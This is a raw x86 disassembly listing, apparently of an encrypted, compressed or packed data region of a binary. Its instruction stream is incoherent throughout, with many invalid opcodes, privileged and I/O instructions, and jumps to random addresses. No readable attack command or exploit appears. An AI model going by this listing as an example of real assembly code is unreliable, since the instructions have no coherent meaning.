  413476:	or     BYTE PTR [ebp+0xdb1bc8f],bl
  41347c:	cdq    
  41347d:	jns    0x4134d3
  41347f:	inc    ebx
  413480:	xor    ebx,ecx
  413482:	inc    ebx
  413483:	dec    esp
  413484:	xchg   DWORD PTR [edi],esi
  413486:	cli    
  413487:	ins    DWORD PTR es:[edi],dx
  413488:	(bad)  
  413489:	jmp    0xdd99cb7a
  41348e:	out    0xd4,al
  413490:	das    
  413491:	repz sbb ah,BYTE PTR [ebx-0x1bfa4ef2]
  413498:	call   0x1d05:0x1d02b9e4
  41349f:	fwait
  4134a0:	jg     0x413435
  4134a2:	jmp    0x413504
  4134a4:	mov    eax,esi
  4134a6:	cdq    
  4134a7:	(bad)  
  4134a8:	(bad)  
  4134a9:	(bad)  
  4134aa:	mov    esp,0x477bf339
  4134af:	hlt    
  4134b0:	dec    ebx
  4134b1:	pop    ds
  4134b2:	outs   dx,DWORD PTR ds:[esi]
  4134b3:	jno    0x4134cd
  4134b5:	push   edi
  4134b6:	jno    0x41351a
  4134b8:	pop    ds
  4134b9:	call   0x51ab2311
  4134be:	mov    ds:0x708f38a,al
  4134c3:	mov    esp,0xcd870443
  4134c8:	test   eax,0x86a92b4d
  4134cd:	imul   ecx,DWORD PTR [eax],0x61154d94
  4134d3:	adc    BYTE PTR [ebx-0x21],dh
  4134d6:	inc    ebx
  4134d7:	sbb    DWORD PTR [ebp-0x2b],edx
  4134da:	mov    ch,0x59
  4134dc:	mov    BYTE PTR [ecx+0x56],ah
  4134df:	jmp    0x4134d8
  4134e1:	sub    al,bh
  4134e3:	fsubp  st(7),st
  4134e5:	xor    esi,esp
  4134e7:	pusha  
  4134e8:	adc    DWORD PTR [ecx+0x1a43e1fa],esp
  4134ee:	sub    edx,DWORD PTR [esi+0x2bcb6fb5]
  4134f4:	mov    ecx,ebx
  4134f6:	enter  0xe99b,0x34
  4134fa:	mov    DWORD PTR ds:0xbff8b412,ebx
  413500:	fstp   QWORD PTR [ecx]
  413502:	pop    edi
  413503:	jb     0x413546
  413505:	es inc ebx
  413507:	fimul  WORD PTR [eax]
  413509:	aam    0x8a
  41350b:	mov    edi,0x393ea5db
  413510:	int    0x66
  413512:	popf   
  413513:	inc    esi
  413514:	cmp    dl,BYTE PTR [ebx]
  413516:	mov    ds:0xdcfcc00f,eax
  41351b:	add    al,0x51
  41351d:	fldenv [ecx+ecx*8+0x1cb1a577]
  413524:	scas   al,BYTE PTR es:[edi]
  413525:	rcl    DWORD PTR [eax-0x780277a0],cl
  41352b:	add    eax,0x631e655f
  413530:	xchg   ecx,eax
  413531:	int3   
  413532:	outs   dx,BYTE PTR ds:[esi]
  413533:	imul   ebx,DWORD PTR [esi+0x6f25d00],0xffffff81
  41353a:	rol    DWORD PTR ds:0xe7531c16,cl
  413540:	outs   dx,BYTE PTR ds:[esi]
  413541:	fstp   TBYTE PTR [eax+0x78357727]
  413547:	(bad)  
  413548:	sub    eax,0x675b374d
  41354d:	mov    ch,0xbb
  41354f:	adc    ebp,DWORD PTR [esi-0x4152f3f1]
  413555:	sti    
  413556:	or     eax,0xca94ebb8
  41355b:	jge    0x41351d
  41355d:	sbb    dh,BYTE PTR [ebx+0x4d339d4f]
  413563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413564:	pushf  
  413565:	sbb    al,0xdf
  413567:	sti    
  413568:	mov    esp,0xfcb4ca03
  41356d:	cld    
  41356e:	mov    edx,0x76a5b081
  413573:	int    0x5a
  413575:	cmp    ah,BYTE PTR [esp+esi*4-0x5cd360f1]
  41357c:	dec    ebx
  41357d:	and    BYTE PTR [esi+0x64307cd4],ch
  413583:	aad    0xee
  413585:	sti    
  413586:	dec    esi
  413587:	inc    esi
  413588:	adc    eax,0xe71cc912
  41358d:	sbb    cl,BYTE PTR [edx]
  41358f:	xor    al,0xbb
  413591:	test   al,0xc1
  413593:	push   ecx
  413594:	pop    ebp
  413595:	jns    0x413578
  413597:	adc    DWORD PTR ds:0x18026eda,esi
  41359d:	mov    ecx,0xffe4504e
  4135a2:	ss ret 0x93bc
  4135a6:	shl    ebp,cl
  4135a8:	push   ebp
  4135a9:	push   esp
  4135aa:	dec    ecx
  4135ab:	mov    cl,0xde
  4135ad:	adc    cl,BYTE PTR [ebx]
  4135af:	inc    ebp
  4135b0:	nop
  4135b1:	cmp    eax,0x5b8a7485
  4135b6:	pop    edx
  4135b7:	push   ds
  4135b8:	sti    
  4135b9:	sub    eax,0x6abf3289
  4135be:	jo     0x41354e
  4135c0:	cmp    ah,BYTE PTR [esi+0x17]
  4135c3:	jmp    0x12663f23
  4135c8:	xor    DWORD PTR [ebx+0x1c],ecx
  4135cb:	sub    BYTE PTR [ebx+0x1],0x80
  4135cf:	into   
  4135d0:	add    ebx,DWORD PTR [ebx]
  4135d2:	bound  ecx,QWORD PTR [ebp+0x3336f91f]
  4135d8:	inc    edx
  4135d9:	repnz fchs 
  4135dc:	das    
  4135dd:	jbe    0x41360e
  4135df:	jge    0x413604
  4135e1:	lds    ebx,FWORD PTR [eax*2-0x744d9c38]
  4135e8:	mov    BYTE PTR [ebx+0x24c02174],ch
  4135ee:	pop    esi
  4135ef:	inc    DWORD PTR [eax+0x44b394c3]
  4135f5:	jmp    FWORD PTR [eax]
  4135f7:	xchg   esp,eax
  4135f8:	das    
  4135f9:	cwde   
  4135fa:	icebp  
  4135fb:	cmc    
  4135fc:	pop    ss
  4135fd:	loop   0x4135d1
  4135ff:	xlat   BYTE PTR ds:[ebx]
  413600:	test   al,cl
  413602:	repz inc ebx
  413604:	pushf  
  413605:	pop    ecx
  413606:	mov    eax,0xca252363
  41360b:	add    DWORD PTR [ebx+ebp*1],0x74c369c2
  413612:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413613:	(bad)  
  413614:	xchg   edx,eax
  413615:	ds xor ebp,esp
  413618:	push   esi
  413619:	(bad)  
  41361a:	mov    edi,0x5a9b6814
  41361f:	push   eax
  413620:	test   eax,0x95b47c2c
  413625:	xor    cl,0x1b
  413628:	mov    ?,WORD PTR [eax-0x26d20183]
  41362e:	retf   0x7ee1
  413631:	push   0xffffff94
  413633:	push   eax
  413634:	or     al,0xb7
  413636:	and    ebx,ebp
  413638:	and    bh,BYTE PTR [ebp+0x1b]
  41363b:	(bad)  
  41363d:	stos   DWORD PTR es:[edi],eax
  41363e:	jbe    0x4136a4
  413640:	xlat   BYTE PTR ds:[ebx]
  413641:	enter  0x278f,0xa6
  413645:	dec    edi
  413646:	mov    eax,ds:0xf4645477
  41364b:	cmp    BYTE PTR [ebx-0x7b9c2f51],dl
  413651:	rcl    DWORD PTR [eax-0x37],0xe6
  413655:	inc    edx
  413656:	pop    ebx
  413657:	push   es
  413658:	adc    DWORD PTR [ebx],edi
  41365a:	push   cs
  41365b:	pop    esp
  41365c:	mov    bl,0x60
  41365e:	xchg   ebp,eax
  41365f:	sbb    eax,0x83ef07b4
  413664:	mov    al,ds:0xd6b729dc
  413669:	sahf   
  41366a:	adc    al,0x5f
  41366c:	sbb    eax,DWORD PTR [edi-0x51]
  41366f:	sbb    ebx,DWORD PTR [edx-0x46]
  413672:	sub    BYTE PTR [esi],ch
  413674:	xchg   ecx,eax
  413675:	push   edx
  413676:	sub    eax,0xf81c6db0
  41367b:	xchg   ah,al
  41367d:	std    
  41367e:	popa   
  41367f:	call   0xcc3c:0x944e4ac2
  413686:	sub    al,0xf0
  413688:	imul   esp,DWORD PTR [edx-0x35bd4a44],0xffffffab
  41368f:	ins    BYTE PTR es:[edi],dx
  413690:	in     eax,dx
  413691:	mov    cl,0x22
  413693:	(bad)  
  413694:	xchg   esi,eax
  413695:	aaa    
  413696:	xchg   ebx,eax
  413697:	xchg   ebx,eax
  413698:	(bad)  
  41369a:	test   DWORD PTR [ebp-0x5a729f20],0xbbfa3e1c
  4136a4:	ret    0xd641
  4136a7:	lods   al,BYTE PTR ds:[esi]
  4136a8:	and    edi,ecx
  4136aa:	add    esi,ecx
  4136ac:	dec    ebp
  4136ad:	inc    esp
  4136ae:	cmp    dh,ch
  4136b0:	clc    
  4136b1:	mov    cs,WORD PTR [eax+0x22]
  4136b4:	cmp    BYTE PTR [edx],ch
  4136b6:	jg     0x41368e
  4136b8:	fistp  DWORD PTR [edx]
  4136ba:	(bad)  
  4136bb:	push   edi
  4136bc:	(bad)  
  4136bd:	cld    
  4136be:	shl    bl,1
  4136c0:	dec    eax
  4136c1:	ror    BYTE PTR [edx+0x73ea4766],cl
  4136c7:	push   ss
  4136c8:	in     eax,dx
  4136c9:	out    dx,eax
  4136ca:	mov    cl,0xda
  4136cc:	stc    
  4136cd:	nop
  4136ce:	hlt    
  4136cf:	mov    ebx,0x551a2e4e
  4136d4:	push   esp
  4136d5:	lds    eax,FWORD PTR [esp+esi*1+0x0]
  4136d9:	cld    
  4136da:	shl    BYTE PTR [esi-0x7a6468fb],1
  4136e0:	lds    esi,FWORD PTR [ecx-0x66]
  4136e3:	cld    
  4136e4:	fidivr WORD PTR cs:[edi-0x7f7e82c6]
  4136eb:	xchg   BYTE PTR [edi+0x297b537b],bh
  4136f1:	jmp    0xa982b0d7
  4136f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136f7:	push   eax
  4136f8:	dec    esp
  4136f9:	mov    ah,0xba
  4136fb:	mov    al,ch
  4136fd:	std    
  4136fe:	sti    
  4136ff:	jl     0x4136ee
  413701:	shr    esp,cl
  413703:	push   edx
  413704:	cmp    BYTE PTR [ecx],bl
  413706:	mov    bh,0xfe
  413708:	mov    al,ds:0xd4d82fb
  41370d:	xchg   ecx,eax
  41370e:	sbb    DWORD PTR [ebp+0x7bd3f0b5],ebx
  413714:	es cmp ah,ah
  413717:	pop    eax
  413718:	scas   al,BYTE PTR es:[edi]
  413719:	push   esi
  41371a:	push   edi
  41371b:	inc    ebp
  41371c:	and    al,0x2b
  41371e:	dec    esi
  41371f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413720:	jecxz  0x4136f9
  413722:	daa    
  413723:	inc    esp
  413724:	or     ebp,DWORD PTR [edi+0x3d255992]
  41372a:	mov    ebx,DWORD PTR [eax]
  41372c:	mov    al,0x5e
  41372e:	mov    bl,0xbb
  413730:	pop    eax
  413731:	daa    
  413732:	addr16 jns 0x4136df
  413735:	push   ds
  413736:	pusha  
  413737:	sub    DWORD PTR [edi],0xffffffed
  41373a:	rol    BYTE PTR [esi-0x40],cl
  41373d:	xor    ebx,DWORD PTR [esi+0x2e]
  413740:	mov    ds:0x9507517d,eax
  413745:	cs xchg edx,eax
  413747:	movhlps xmm3,xmm5
  41374a:	es jne 0x413709
  41374d:	cmp    eax,0xb40dc3f3
  413752:	and    esp,DWORD PTR [edx+0x5d]
  413755:	and    esp,esp
  413757:	xchg   ebx,eax
  413758:	inc    ebp
  413759:	or     edx,ecx
  41375b:	pop    ebx
  41375c:	dec    edi
  41375d:	xchg   esi,eax
  41375e:	and    DWORD PTR [edx+0x5ba16c48],ecx
  413764:	idiv   BYTE PTR [esi+0x3c81b084]
  41376a:	(bad)  
  41376b:	cmc    
  41376c:	gs xchg ecx,eax
  41376e:	fstp   TBYTE PTR [edx+0x73de1496]
  413774:	sahf   
  413775:	sbb    edi,DWORD PTR [ebp+0x2c]
  413778:	cwde   
  413779:	pop    es
  41377a:	rcl    edi,cl
  41377c:	mov    ch,0x8f
  41377e:	jbe    0x4137de
  413780:	jg     0x41371e
  413782:	nop
  413783:	or     BYTE PTR [eax+0x2147723f],dl
  413789:	adc    al,0x9a
  41378b:	je     0x413724
  41378d:	test   al,0x26
  41378f:	sbb    al,0xcf
  413791:	xchg   DWORD PTR [ebx],edx
  413793:	pop    ecx
  413794:	pop    edx
  413795:	out    dx,eax
  413796:	cli    
  413797:	push   ebx
  413798:	add    BYTE PTR [ecx+ecx*4-0x6],0xf6
  41379d:	retf   0xb612
  4137a0:	sub    cl,BYTE PTR [esi+esi*4-0x69]
  4137a4:	jge    0x413736
  4137a6:	out    dx,al
  4137a7:	mov    esp,fs
  4137a9:	addr16 adc eax,0x22382799
  4137af:	repnz aaa 
  4137b1:	mov    bh,0xa7
  4137b3:	inc    edx
  4137b4:	or     eax,0xa0fcf46d
  4137b9:	xor    BYTE PTR [esi+eax*8+0x6d],al
  4137bd:	xor    DWORD PTR [ebx+0x21],ebx
  4137c0:	pop    eax
  4137c1:	sti    
  4137c2:	xchg   esp,eax
  4137c3:	loop   0x413831
  4137c5:	sub    DWORD PTR [edx-0x37],esp
  4137c8:	inc    esi
  4137c9:	jecxz  0x413772
  4137cb:	inc    ecx
  4137cc:	jle    0x41383d
  4137ce:	and    esp,DWORD PTR [ebx]
  4137d0:	push   ebx
  4137d1:	bound  ecx,QWORD PTR [ebx]
  4137d3:	(bad)  
  4137d4:	xchg   ecx,eax
  4137d5:	dec    ecx
  4137d6:	mov    al,0x77
  4137d8:	aas    
  4137d9:	pop    esi
  4137da:	neg    bh
  4137dc:	lahf   
  4137dd:	mov    ecx,0xd983cb9
  4137e2:	sub    BYTE PTR [edx],0xdc
  4137e5:	cmp    al,BYTE PTR [edx+ecx*1+0x11]
  4137e9:	mov    DWORD PTR [ebx-0x3b],ebx
  4137ec:	inc    eax
  4137ed:	inc    esp
  4137ee:	sub    DWORD PTR [eax],esp
  4137f0:	push   eax
  4137f1:	mov    dh,0xc5
  4137f3:	nop
  4137f4:	ret    0x2325
  4137f7:	mov    esp,0xe92d814a
  4137fc:	xlat   BYTE PTR ds:[ebx]
  4137fd:	and    eax,0x30777e34
  413802:	adc    eax,0x7fdc3056
  413807:	iret   
  413808:	add    edi,DWORD PTR [ebp+0x5d]
  41380b:	mov    edx,0xa62da163
  413810:	sub    eax,0xea34d103
  413815:	addr16 adc al,0x44
  413818:	push   esp
  413819:	mov    esi,0xc9b9c9f2
  41381e:	xor    ecx,esp
  413820:	jo     0x4137e5
  413822:	ror    dh,0x59
  413825:	mov    ecx,0xbea4327b
  41382a:	pop    esp
  41382b:	mov    bh,bl
  41382d:	jle    0x41384f
  41382f:	or     BYTE PTR [edi],bh
  413831:	ins    BYTE PTR es:[edi],dx
  413832:	fistp  QWORD PTR [edx+0x29]
  413835:	jge    0x413813
  413837:	aaa    
  413838:	iret   
  413839:	fdivr  QWORD PTR [ebp+ecx*8-0x5]
  41383d:	xchg   esp,eax
  41383e:	enter  0x6c84,0x3
  413842:	or     al,0xc8
  413844:	ficom  DWORD PTR [ebp-0x13]
  413847:	sub    DWORD PTR [eax+0x2b],eax
  41384a:	or     al,0x1e
  41384c:	xor    BYTE PTR [ecx+0x66],ch
  41384f:	sbb    dh,BYTE PTR [ebx+0x6db9eb7]
  413855:	mov    ds:0x66d557c0,eax
  41385a:	add    BYTE PTR [edx+0x54],0x67
  41385e:	rcl    ecx,1
  413860:	push   edx
  413861:	adc    al,0x71
  413863:	les    esp,FWORD PTR [ebx]
  413865:	mov    al,dl
  413867:	sti    
  413868:	xor    BYTE PTR [ecx-0x43c53cea],al
  41386e:	mov    bl,BYTE PTR [eax-0x7c5334c]
  413874:	stos   DWORD PTR es:[edi],eax
  413875:	ins    BYTE PTR es:[edi],dx
  413876:	cmp    eax,0xa7599d5d
  41387b:	xor    eax,0x64dd29c8
  413880:	pop    es
  413881:	adc    al,0x4a
  413883:	(bad)  
  413884:	imul   esp,edi,0x27
  413887:	dec    esi
  413888:	mov    esi,0x6780025d
  41388d:	adc    DWORD PTR [ecx-0x42c8c3f4],esi
  413893:	sub    ch,BYTE PTR [edi-0x46d2a67f]
  413899:	mov    al,0x5a
  41389b:	(bad)  
  41389c:	jl     0x4138e8
  41389e:	fisub  DWORD PTR [ecx+0x49e0c792]
  4138a4:	jbe    0x41391a
  4138a6:	ja     0x413895
  4138a8:	mov    ecx,0xac144778
  4138ad:	xor    ah,BYTE PTR [edi+esi*2]
  4138b0:	popa   
  4138b1:	dec    edi
  4138b2:	cmp    BYTE PTR [eax],cl
  4138b4:	shl    BYTE PTR [edi],cl
  4138b6:	mov    edi,DWORD PTR [ecx-0x1]
  4138b9:	jbe    0x413932
  4138bb:	js     0x413924
  4138bd:	sti    
  4138be:	pop    esi
  4138bf:	cmp    edx,esi
  4138c1:	cmp    bl,BYTE PTR [ebp-0x557a6718]
  4138c7:	add    eax,0x4e3bee9a
  4138cc:	mov    BYTE PTR [edi+ebp*4],0x32
  4138d0:	mov    cl,0x8
  4138d2:	cmp    DWORD PTR [ebx+ecx*1],esp
  4138d5:	pop    ecx
  4138d6:	in     eax,dx
  4138d7:	or     dl,BYTE PTR [esi]
  4138d9:	pop    DWORD PTR [bx+si-0x5b19]
  4138de:	out    dx,eax
  4138df:	iret   
  4138e0:	pop    ds
  4138e1:	(bad)  
  4138e2:	int3   
  4138e3:	out    dx,eax
  4138e4:	mov    dl,0x6
  4138e6:	cwde   
  4138e7:	jo     0x4138b4
  4138e9:	lods   eax,DWORD PTR ds:[esi]
  4138ea:	mov    ?,WORD PTR [ebp-0x5d9ed87e]
  4138f0:	dec    edi
  4138f1:	cmp    eax,0x1211d14
  4138f6:	ret    
  4138f7:	xchg   ebp,eax
  4138f8:	jecxz  0x4138ce
  4138fa:	xchg   al,bl
  4138fc:	mov    bh,0xb6
  4138fe:	fmul   DWORD PTR ds:0x8df3e373
  413904:	daa    
  413905:	or     edi,esp
  413907:	and    ebx,DWORD PTR [ecx+0x3739409f]
  41390d:	jge    0x413909
  41390f:	adc    edx,ecx
  413911:	push   ds
  413912:	add    ebx,DWORD PTR [esi-0x715ab954]
  413918:	push   ss
  413919:	cmp    eax,0xe41dfa48
  41391e:	nop
  41391f:	xor    BYTE PTR [esi+0x11c1c493],al
  413925:	addr16 mov al,ds:0x2189
  413929:	push   0x89706b4a
  41392e:	sbb    eax,0x631637d9
  413933:	xlat   BYTE PTR ds:[ebx]
  413934:	in     eax,dx
  413935:	shl    bl,1
  413937:	jmp    0x41393a
  413939:	(bad)  
  41393b:	mov    BYTE PTR [eax+0x7c88f77f],dh
  413941:	out    0x8d,al
  413943:	bound  ebx,QWORD PTR [edi+0x28]
  413946:	mov    ebx,0xe6fad3a7
  41394b:	iret   
  41394c:	xor    edi,DWORD PTR [edi-0x191f26e4]
  413952:	mov    ebx,0xe6e09bd9
  413957:	inc    ebx
  413958:	and    DWORD PTR [bp+di+0x7f],esi
  41395c:	fcom   st(7)
  41395e:	mov    bh,0x8b
  413960:	xchg   ecx,ebx
  413962:	in     al,dx
  413963:	jge    0x413940
  413965:	or     dh,BYTE PTR [ecx+0xfbc6e7]
  41396b:	xchg   ebx,eax
  41396c:	mov    esi,0x643cf7a0
  413971:	jb     0x4139a0
  413973:	das    
  413974:	jl     0x41395c
  413976:	add    eax,0x389355c
  41397b:	and    ecx,DWORD PTR [edx]
  41397d:	cmp    eax,0x9b275e38
  413982:	adc    DWORD PTR [ecx-0x7398f31a],edx
  413988:	dec    ebp
  413989:	mov    esp,0xc4fd4fc5
  41398e:	lahf   
  41398f:	jecxz  0x41391f
  413991:	xlat   BYTE PTR ds:[ebx]
  413992:	xor    BYTE PTR [edi-0x62],ah
  413995:	xor    ebp,DWORD PTR ds:0x36a53d6f
  41399b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41399c:	pop    edi
  41399d:	mov    ds:0x5437b7e0,eax
  4139a2:	mov    al,ds:0x2ca3a368
  4139a7:	mov    ds:0x7e8ac07a,eax
  4139ac:	jmp    0x699b:0x1db95664
  4139b3:	and    BYTE PTR [edx],0x46
  4139b6:	scas   eax,DWORD PTR es:[edi]
  4139b7:	jmp    0x4139a7
  4139b9:	mov    dl,0x13
  4139bb:	call   0x4fb5:0xf556af7d
  4139c2:	lea    edx,[ecx]
  4139c4:	aad    0x46
  4139c6:	scas   eax,DWORD PTR es:[edi]
  4139c7:	jno    0x4139a1
  4139c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139ca:	push   ebp
  4139cb:	dec    esp
  4139cc:	sbb    ah,dl
  4139ce:	dec    ecx
  4139cf:	in     eax,0x48
  4139d1:	xchg   edx,eax
  4139d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139d3:	dec    edi
  4139d4:	test   DWORD PTR [eax-0x29fef3a],ebx
  4139da:	jae    0x41396c
  4139dc:	pop    ds
  4139dd:	pop    esi
  4139de:	sub    al,0xca
  4139e0:	add    ecx,DWORD PTR ds:0xbbdaa5f1
  4139e6:	shr    DWORD PTR [eax+0x3db34fb7],cl
  4139ec:	aad    0x87
  4139ee:	out    0xe7,al
  4139f0:	retf   0x149a
  4139f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139f4:	inc    edi
  4139f5:	nop
  4139f6:	xchg   DWORD PTR [edi],esi
  4139f8:	cwde   
  4139f9:	xchg   esp,eax
  4139fa:	xchg   ecx,eax
  4139fb:	ror    DWORD PTR [edx],1
  4139fd:	push   ebx
  4139fe:	mov    bl,0xa3
  413a00:	and    eax,0xa6fa1e16
  413a05:	leave  
  413a06:	in     al,0xb2
  413a08:	and    eax,DWORD PTR ds:0xb836d262
  413a0e:	push   eax
  413a0f:	inc    esp
  413a10:	adc    DWORD PTR [ecx+0x19],0xd68da9fa
  413a17:	call   0x7fc:0x91a850eb
  413a1e:	inc    edi
  413a1f:	(bad)  
  413a21:	out    dx,al
  413a22:	adc    dh,BYTE PTR [eax]
  413a24:	inc    eax
  413a25:	push   ebp
  413a26:	mov    BYTE PTR [ebx-0x3e],dh
  413a29:	ins    DWORD PTR es:[edi],dx
  413a2a:	repnz popa 
  413a2c:	push   0x2f
  413a2e:	pop    edx
  413a2f:	clts   
  413a31:	push   eax
  413a32:	mov    ebx,0xbd676927
  413a37:	xchg   ecx,eax
  413a38:	sub    cl,bh
  413a3a:	shl    ecx,1
  413a3c:	sub    eax,0x96580039
  413a41:	inc    edx
  413a42:	aas    
  413a43:	cwde   
  413a44:	add    bl,BYTE PTR [edx]
  413a46:	xchg   DWORD PTR cs:[ecx],edi
  413a49:	in     al,0xe9
  413a4b:	pop    ebp
  413a4c:	in     al,dx
  413a4d:	cmp    dh,BYTE PTR [edx]
  413a4f:	push   0xffffffc5
  413a51:	test   ax,0xecd9
  413a55:	mov    bh,ah
  413a57:	pop    ebp
  413a58:	addr16 mov bl,0x59
  413a5b:	mov    WORD PTR [eax],cs
  413a5d:	or     BYTE PTR [ebx+0x3],bh
  413a60:	sbb    DWORD PTR [ecx-0x6ef111d3],edi
  413a66:	mov    eax,DWORD PTR [edi]
  413a68:	leave  
  413a69:	and    eax,0xccad4594
  413a6e:	inc    esp
  413a6f:	push   eax
  413a70:	add    eax,0x772e26eb
  413a75:	mov    eax,DWORD PTR [eax-0x4]
  413a78:	mov    bl,0x57
  413a7a:	clc    
  413a7b:	push   edi
  413a7c:	jecxz  0x413af6
  413a7e:	cmp    al,BYTE PTR [ebx-0x4d66e375]
  413a84:	push   ss
  413a85:	call   0x1ac4a240
  413a8a:	sbb    ebp,edx
  413a8c:	repnz push 0xfffffffe
  413a8f:	mov    eax,ds:0xaa864009
  413a94:	jecxz  0x413abe
  413a96:	push   0xfffffffe
  413a98:	int3   
  413a99:	xor    DWORD PTR [ecx+0x63d66e9],0x4d
  413aa0:	popa   
  413aa1:	js     0x413aff
  413aa3:	push   edi
  413aa4:	sar    DWORD PTR [eax],1
  413aa6:	jae    0x413a7c
  413aa8:	add    ch,BYTE PTR [edi+0x11]
  413aab:	add    cl,BYTE PTR [eax-0x75]
  413aae:	(bad)  
  413aaf:	mov    eax,0xd1279855
  413ab4:	into   
  413ab5:	ret    0x449c
  413ab8:	sbb    eax,0xa8b81127
  413abd:	pop    ebx
  413abe:	ror    BYTE PTR [eax+0x79],1
  413ac1:	push   eax
  413ac2:	mov    bl,BYTE PTR [ecx+eax*8-0x7]
  413ac6:	imul   eax,esi,0xffffffd0
  413ac9:	pop    esi
  413aca:	dec    ebx
  413acb:	sub    DWORD PTR [ecx-0x5c],ebp
  413ace:	push   DWORD PTR ds:0xf75b3952
  413ad4:	xor    al,0xdc
  413ad6:	fadd   QWORD PTR [ebx-0x46fa12bf]
  413adc:	pop    eax
  413add:	enter  0xc7b,0x20
  413ae1:	sbb    DWORD PTR ds:0x8c55bbde,esi
  413ae7:	dec    ebp
  413ae8:	test   al,0x89
  413aea:	adc    bl,BYTE PTR [esi-0x76101639]
  413af0:	dec    ebx
  413af1:	sub    BYTE PTR [ebx-0x20],0xb6
  413af5:	das    
  413af6:	or     al,0xde
  413af8:	clc    
  413af9:	jmp    0xd3f4:0x1aea4d6
  413b00:	mov    edx,0x32d2a1e8
  413b05:	ror    DWORD PTR [ecx-0x2d],1
  413b08:	cmp    al,0x56
  413b0a:	jmp    0xf74e:0xecce28e7
  413b11:	jle    0x413b72
  413b13:	cmp    eax,0xae0683e0
  413b18:	mov    bl,ch
  413b1a:	sahf   
  413b1b:	test   BYTE PTR ds:[ebx+0x3f8979af],dh
  413b22:	(bad)  
  413b23:	(bad)  
  413b24:	inc    esp
  413b25:	repnz xchg edi,eax
  413b27:	enter  0x22b3,0x6d
  413b2b:	imul   ecx,DWORD PTR [eax-0x250b83bc],0xffffffdc
  413b32:	push   edx
  413b33:	outs   dx,BYTE PTR ds:[esi]
  413b34:	pop    ebx
  413b35:	or     eax,esp
  413b37:	fld    QWORD PTR [eax+esi*4-0x21]
  413b3b:	jecxz  0x413ae8
  413b3d:	xor    cl,0xbb
  413b40:	jbe    0x413ac5
  413b42:	lahf   
  413b43:	mov    al,0x19
  413b45:	xor    eax,DWORD PTR [ecx-0x2b]
  413b48:	es jo  0x413b23
  413b4b:	sbb    ah,bl
  413b4d:	in     eax,dx
  413b4e:	or     dh,BYTE PTR [ecx+0x753d8082]
  413b54:	mov    WORD PTR [ecx+esi*1-0x731089b8],ds
  413b5b:	lds    edx,FWORD PTR [ebx-0x75]
  413b5e:	(bad)  
  413b60:	aaa    
  413b61:	mov    cl,0x69
  413b63:	and    BYTE PTR [edi+0x31],bl
  413b66:	xor    eax,DWORD PTR [ebx-0x57f6263]
  413b6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b6d:	vsubsd xmm3,xmm2,xmm7
  413b71:	ret    
  413b72:	mov    al,ds:0x66176526
  413b77:	arpl   WORD PTR [ebp-0x48],bx
  413b7a:	adc    BYTE PTR [esi],bh
  413b7c:	inc    edi
  413b7d:	jbe    0x413bae
  413b7f:	aad    0xce
  413b81:	adc    bl,cl
  413b83:	push   edi
  413b84:	xor    bl,BYTE PTR [edi+eax*2-0x58]
  413b88:	sub    ah,BYTE PTR [eax+0x65c7cd52]
  413b8e:	(bad)  
  413b8f:	push   0x44de20bd
  413b94:	or     BYTE PTR [ecx+eax*8-0x3ddd2d4f],dl
  413b9b:	adc    bh,BYTE PTR [ebp+0xa]
  413b9e:	retf   0x78d6
  413ba1:	outs   dx,BYTE PTR ds:[esi]
  413ba2:	lods   al,BYTE PTR ds:[esi]
  413ba3:	pop    es
  413ba4:	(bad)  
  413ba5:	addr16 shl ch,0xb8
  413ba9:	fmul   DWORD PTR es:[ebp+0x31]
  413bad:	fadd   st,st(7)
  413baf:	ret    
  413bb0:	mov    al,ds:0xd5071c14
  413bb5:	pusha  
  413bb6:	sbb    ebp,DWORD PTR [eax+0x23]
  413bb9:	out    dx,eax
  413bba:	pop    edx
  413bbb:	pop    ds
  413bbc:	fsubr  QWORD PTR [esi+esi*1-0x49]
  413bc0:	(bad)  
  413bc1:	in     al,0x58
  413bc3:	jp     0x413bab
  413bc5:	sbb    al,bh
  413bc7:	and    eax,0x32cb487c
  413bcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bcd:	jne    0x413bd0
  413bcf:	fnstsw WORD PTR [edi+0xd3cd56f]
  413bd5:	pusha  
  413bd6:	inc    ebp
  413bd7:	outs   dx,BYTE PTR ds:[esi]
  413bd8:	xchg   ebx,eax
  413bd9:	xchg   edx,eax
  413bda:	jns    0x413bb7
  413bdc:	pop    edi
  413bdd:	and    bl,BYTE PTR [esi+0x73]
  413be0:	inc    esi
  413be1:	nop
  413be2:	add    ecx,DWORD PTR [ebx*2+0x55a2e8b]
  413be9:	fs scas al,BYTE PTR es:[edi]
  413beb:	jb     0x413bc9
  413bed:	xor    ebp,ebp
  413bef:	scas   eax,DWORD PTR es:[edi]
  413bf0:	mov    eax,ds:0xada69e8d
  413bf5:	sbb    BYTE PTR [edx-0x2b],cl
  413bf8:	cmp    dl,ah
  413bfa:	fimul  DWORD PTR [edi-0x7c69e9d8]
  413c00:	arpl   WORD PTR [ebp+0x231d83fd],sp
  413c06:	out    dx,eax
  413c07:	hlt    
  413c08:	sub    ebp,esi
  413c0a:	or     al,0xa7
  413c0c:	pop    ss
  413c0d:	mov    ch,0xa7
  413c0f:	xor    dh,0x26
  413c12:	aad    0x6b
  413c14:	jno    0x413c94
  413c16:	retf   0x25ef
  413c19:	push   0x65d0d0cd
  413c1e:	ss sti 
  413c20:	into   
  413c21:	out    0x2,al
  413c23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c24:	xchg   ebx,eax
  413c25:	not    DWORD PTR [ecx]
  413c27:	jns    0x413c88
  413c29:	xchg   ebp,eax
  413c2a:	mov    al,ds:0x2c0c7c81
  413c2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c30:	and    BYTE PTR [eax+ecx*1],bl
  413c33:	push   esp
  413c34:	sub    BYTE PTR [edx],ah
  413c36:	mov    edx,es
  413c38:	sbb    esi,DWORD PTR [esi+edi*4-0x1ed6a98]
  413c3f:	push   ebp
  413c40:	ss add al,0x6e
  413c43:	cmp    edi,DWORD PTR [ecx-0x64]
  413c46:	dec    edi
  413c47:	xchg   ebx,eax
